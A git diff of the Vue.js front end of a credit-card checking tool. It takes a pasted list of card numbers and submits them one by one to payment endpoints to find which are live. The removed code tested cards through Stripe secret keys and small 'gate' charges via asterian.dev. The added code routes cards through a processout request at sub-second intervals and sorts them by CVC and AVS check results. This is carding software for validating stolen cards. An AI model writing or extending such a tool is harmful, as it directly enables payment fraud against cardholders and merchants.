@@ -7,12 +7,12 @@
     </v-tabs>
     <v-tabs-items v-model="tab">
       <v-tab-item>
-        <div class="d-flex justify-center align-center" style="height:80vh">
+        <div class="d-flex justify-center align-center" style="height:85vh">
           Coming Soon
         </div>
       </v-tab-item>
       <v-tab-item>
-        <div class="px-5 pt-2 " style="height:100%">
+        <div class="px-5 pt-2 " style="height:85vh">
           <div class="pb-5">
             <v-textarea
               solo
@@ -21,13 +21,6 @@
               :rows="10"
               v-model="ccs"
             ></v-textarea>
-            <v-text-field
-              :loading="skcheck"
-              label="Enter SK"
-              placeholder="sk_live_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
-              :rules="[(value) => !!value || 'Required.']"
-              v-model="sk"
-            ></v-text-field>
           </div>
           <div class="pb-5">
             <v-btn
@@ -47,21 +40,6 @@
             >
               Stop Checking
             </v-btn>
-            <v-btn
-              class="mr-5 mb-5"
-              elevation="2"
-              color="primary"
-              @click="checkSK"
-              >Check SK</v-btn
-            >
-            <v-select
-              :items="gates"
-              label="Choose Gate"
-              style="width:200px"
-              class="d-inline-block mr-5"
-              v-model="gate"
-              :disabled="loading2"
-            ></v-select>
             <v-select
               :items="delays"
               label="Choose Delay"
@@ -70,14 +48,6 @@
               class="d-inline-block"
               :disabled="loading2"
             ></v-select>
-
-            <v-switch
-              v-model="switch1"
-              class="pt-4 pb-4"
-              inset
-              label="Play Music While Checking"
-              :disabled="loading2"
-            ></v-switch>
           </div>
         </div>
       </v-tab-item>
@@ -258,17 +228,8 @@ export default {
       loading2: false,
       skcheck: false,
       switch1: false,
-      gates: [
-        "Stripe Auth",
-        "Stripe Charge : 0.5 $",
-        "Stripe Charge : 0.8 $",
-        "Stripe Charge : 1 $",
-        "Stripe Charge : 2 $",
-        "Stripe Charge : 5 $",
-      ],
-      delays: ["1 second", "2 seconds", "3 seconds"],
-      gate: "Stripe Auth",
-      delay: "1 second",
+      delays: ["0.2 second", "0.35 second", "0.5 second"],
+      delay: "0.2 second",
       noti: false,
       notitext: "Your SK is Live",
       noticolor: "success",
@@ -325,20 +286,13 @@ export default {
         this.noti = true;
         return null;
       }
-      if (this.sk == null || this.sk == "") {
-        this.notitext = "No SK input!";
-        this.noticolor = "error";
-        this.noti = true;
-        return null;
-      }
       this.loading2 = true;
-      localStorage.setItem("sk_key", this.sk);
       let tmpdelay =
-        this.delay == "1 second"
-          ? 1000
-          : this.delay == "2 seconds"
-          ? 2000
-          : 3000;
+        this.delay == "0.2 second"
+          ? 200
+          : this.delay == "0.35 second"
+          ? 350
+          : 500;
       let checkInterval = setInterval(() => {
         if (this.ccs == "" || this.interuption) {
           this.loading2 = false;
@@ -346,143 +300,10 @@ export default {
           this.interuption = false;
         } else {
           let tmpcc = this.ccs.split("\n")[0];
-          if (this.gate == "Stripe Auth") {
-            this.check(tmpcc);
-          } else {
-            if (this.gate == this.gates[1]) {
-              this.charge(tmpcc, 50);
-            } else if (this.gate == this.gates[2]) {
-              this.charge(tmpcc, 80);
-            } else if (this.gate == this.gates[3]) {
-              this.charge(tmpcc, 100);
-            } else if (this.gate == this.gates[4]) {
-              this.charge(tmpcc, 200);
-            } else {
-              this.charge(tmpcc, 500);
-            }
-          }
+          this.processout(tmpcc);
           this.deleteline();
         }
       }, tmpdelay);
-    },
-    check(cc) {
-      axios
-        .post("https://asterian.dev/checker.php", {
-          cc: cc,
-          sk_key: this.sk,
-        })
-        .then((res) => {
-          let data = res.data;
-          if (data.includes("CVV LIVE")) {
-            this.livecvv.push({
-              number: data
-                .split(">")[0]
-                .trim()
-                .replace("CVV LIVE ", ""),
-              result: data.split(">")[1],
-            });
-          } else if (data.includes("CCN LIVE")) {
-            this.dead.push({
-              number: data
-                .split(">")[0]
-                .trim()
-                .replace("CCN LIVE ", ""),
-              result: data.split(">")[1],
-            });
-          } else {
-            if (data.includes("SK")) {
-              this.dead.push({
-                number: "SK Error",
-                result: "Your SK is invalid or dead.",
-              });
-            } else {
-              this.dead.push({
-                number: data
-                  .split(">")[0]
-                  .trim()
-                  .replace("DEAD ", ""),
-                result: data.split(">")[1],
-              });
-            }
-          }
-        });
-    },
-    charge(cc, amount) {
-      axios
-        .post("https://asterian.dev/charge.php", {
-          cc: cc,
-          sk_key: this.sk,
-          amount: amount,
-        })
-        .then((res) => {
-          let data = res.data;
-          if (data.includes("CVV LIVE")) {
-            if (data.includes("Charged")) {
-              this.livecvv.push({
-                number: data.split(" > ")[0].replace("CVV LIVE ", ""),
-                result: data
-                  .split(" > ")[1]
-                  .replace("<a", "<a style='text-decoration:none;'"),
-              });
-            } else {
-              this.livecvv.push({
-                number: data
-                  .split(">")[0]
-                  .trim()
-                  .replace("CVV LIVE ", ""),
-                result: data.split(">")[1],
-              });
-            }
-          } else if (data.includes("CCN")) {
-            this.ccn.push({
-              number: data
-                .split(">")[0]
-                .trim()
-                .replace("CCN LIVE ", ""),
-              result: data.split(">")[1],
-            });
-          } else {
-            if (data.includes("SK")) {
-              this.dead.push({
-                number: "SK Error",
-                result: "Your SK is invalid or dead.",
-              });
-            } else {
-              this.dead.push({
-                number: data
-                  .split(">")[0]
-                  .trim()
-                  .replace("DEAD ", ""),
-                result: data.split(">")[1],
-              });
-            }
-          }
-        });
-    },
-    checkSK() {
-      if (this.sk == null || this.sk == "") {
-        this.notitext = "No SK input!";
-        this.noticolor = "error";
-        this.noti = true;
-        return null;
-      }
-      this.skcheck = true;
-      axios
-        .post("https://asterian.dev/sk.php", { sk: this.sk })
-        .then(({ data }) => {
-          if (data.includes("LIVE")) {
-            this.notitext = "Your SK is Live.";
-            this.noticolor = "success";
-            this.noti = true;
-            this.skcheck = false;
-          } else {
-            this.notitext = "Your SK is Dead.";
-            this.noticolor = "error";
-            this.noti = true;
-            this.skcheck = false;
-            this.sk = "";
-          }
-        });
     },
     processout(cc) {
       let data = {
@@ -504,15 +325,26 @@ export default {
       };
 
       axios(config).then(({ data }) => {
-        console.log(data);
+        if (
+          data.card.cvc_check == "unavailable" &&
+          data.card.avs_check == "unavailable"
+        ) {
+          this.dead.push({
+            number: cc,
+            result:
+              "cvc_check: " +
+              data.card.cvc_check +
+              " avs_check: " +
+              data.card.avs_check,
+          });
+        } else {
+          this.livecvv.push({
+            number: cc,
+            result: data.card.cvc_check,
+          });
+        }
       });
     },
-  },
-  created() {
-    let tmpsk = localStorage.getItem("sk_key");
-    if (tmpsk != null && tmpsk != "" && tmpsk != "null") {
-      this.sk = tmpsk;
-    }
   },
 };
 </script>
